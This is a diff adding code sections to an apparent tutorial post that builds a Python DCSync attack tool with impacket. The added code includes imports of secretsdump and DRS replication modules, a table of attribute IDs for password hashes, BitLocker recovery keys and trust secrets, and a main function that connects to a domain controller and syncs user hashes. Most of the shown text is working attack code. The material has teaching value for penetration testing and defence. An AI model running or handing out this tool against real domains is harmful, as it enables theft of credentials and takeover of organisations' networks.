@@ -36,6 +36,82 @@ To executing the DCSync attack requires the following replication permissions on
 
 Common tools for DCSync include Mimikatz and Impacket. In this post I will demonstrate the process with a simplified Python script that utilizes impacket to extract solely the current user hashes from a domain controller.
 
+### utils
+```python
+import argparse
+from impacket.examples.utils import parse_target
+from impacket.ldap.ldap import LDAPConnection, SimplePagedResultsControl, LDAPSessionError
+from impacket.smbconnection import SMBConnection
+from impacket.dcerpc.v5.dtypes import NULL, SID
+from impacket.ldap.ldapasn1 import SearchResultEntry
+from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
+from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
+from impacket.uuid import string_to_bin
+from impacket import LOG
+from impacket import ntlm
+import uuid
+from binascii import unhexlify, hexlify
+from struct import unpack, pack
+
+class oids:
+    ATTRTYP_TO_ATTID = {
+            'name' : '1.2.840.113556.1.4.1',
+            'sAMAccountName' : '1.2.840.113556.1.4.221',
+            'userPrincipalName' : '1.2.840.113556.1.4.656',
+            'sAMAccountType' : '1.2.840.113556.1.4.302',
+            'userAccountControl' : '1.2.840.113556.1.4.8',
+            'accountExpires' : '1.2.840.113556.1.4.159',
+            'pwdLastSet' : '1.2.840.113556.1.4.96',
+            'objectSid' : '1.2.840.113556.1.4.146',
+            'sIDHistory' : '1.2.840.113556.1.4.609',
+            'unicodedPwd' : '1.2.840.113556.1.4.90',
+            'ntPwdHistory' : '1.2.840.113556.1.4.94',
+            'dBCSPwd' : '1.2.840.113556.1.4.55',
+            'lmPwdHistory' : '1.2.840.113556.1.4.160',
+            'supplementalCredentials' : '1.2.840.113556.1.4.125',
+            'msFVEKeyPackage' : '1.2.840.113556.1.4.1999',
+            'msFVERecoveryGuid' : '1.2.840.113556.1.4.1965',
+            'msFVEVolumeGuid' : '1.2.840.113556.1.4.1998',
+            'msFVERecoveryPassword' : '1.2.840.113556.1.4.1964',
+            'trustPartner' : '1.2.840.113556.1.4.133',
+            'trustAuthIncoming' : '1.2.840.113556.1.4.129',
+            'trustAuthOutgoing' : '1.2.840.113556.1.4.135',
+            'currentValue': '1.2.840.113556.1.4.27',
+            'isDeleted' : '1.2.840.113556.1.2.48'
+    }
+
+
+    def __init__(self):
+        pass
+```
+
+### 0. Create a main function and argument parser
+```python
+def main():
+    parser = argparse.ArgumentParser(description = "Performs a DCSync-Attack against a DC")
+
+    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName')
+    parser.add_argument('-users', action='store_true', help='DC-Sync User Accounts')
+    parser.add_argument('-backupkey', action='store_true', help='DC-Sync DPAPI-Backupkey')
+
+
+    group = parser.add_argument_group('authentication')
+    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
+                             ' the ones specified in the command line')
+    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
+                                                                            ' (128 or 256 bits)')
+
+
+
+    options = parser.parse_args()
+    domain, username, password, remoteName = parse_target(options.target)
+    options.target_ip = remoteName
+    options.dc_ip = remoteName
+```
+
 ### 1. Initialize a DCSync Class
 First of all, I initialize a DCSync class that handles the authentication and connections to the SMB and LDAP service on the domain controller. This is just boilerplate code copied from multiple impacket examples.
 ```python
@@ -399,4 +475,43 @@ def decryptHash(dumper, record, prefixTable=None, outputFile=None):
             print(answer)
             if outputFile is not None:
                 self.__writeOutput(outputFile, answer + '\n')
+```
+
+## 7. Adapt main function
+```python
+def main():
+    parser = argparse.ArgumentParser(description = "Performs a DCSync-Attack against a DC")
+
+    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName')
+
+
+    group = parser.add_argument_group('authentication')
+    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
+                             ' the ones specified in the command line')
+    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
+                                                                            ' (128 or 256 bits)')
+
+
+
+    options = parser.parse_args()
+    domain, username, password, remoteName = parse_target(options.target)
+    options.target_ip = remoteName
+    options.dc_ip = remoteName
+
+    dumper = DumpSecrets(remoteName, username, password, domain, options)
+
+
+    # Connect to RPC with DRS Protocol
+    dumper.connect()
+    connectDrds(dumper)
+    
+    # DCSync the desired objects
+    sync_users(dumper)
+
+    # Close remaining connections
+    disconnectLdap(dumper)
+    disconnectSmb(dumper)
+    disconnectDrds(dumper)
 ```
